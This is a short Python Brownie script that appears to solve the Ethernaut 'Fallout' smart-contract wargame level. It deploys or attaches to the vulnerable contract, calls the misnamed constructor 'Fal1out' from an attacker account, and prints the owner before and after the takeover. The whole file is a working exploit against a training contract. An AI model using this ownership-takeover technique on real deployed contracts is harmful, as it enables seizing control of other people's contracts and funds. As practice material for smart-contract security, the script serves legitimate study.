from brownie import Fallout, interface
from colorama import Fore
from scripts.deploy import deploy
from scripts.helpful_scripts import get_account

# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET


def attack(contract_address=None, attacker=None):
    if not contract_address:
        fallout_contract, owner = deploy()
        contract_address = fallout_contract.address
        # ? Geeting the accounst for local testing
        _, attacker = get_account()
    # print(contract_address)
    fallout_contract = Fallout.at(contract_address)
    print(
        f"{green}Current Owner of the contract: {magenta}{fallout_contract.owner()}{reset}"
    )
    print(f"{blue}Attacker address: {red}{attacker}{reset}")
    # exit(1)

    fallout = interface.Fallout(contract_address)
    attacking_tx = fallout.Fal1out({"from": attacker})
    # attacking_tx.wait(1)
    print(f"{green}New Owner: {red}{fallout_contract.owner()}{reset}")


def main(contract_address=None):
    if contract_address:
        attack(contract_address, get_account())
    else:
        attack()
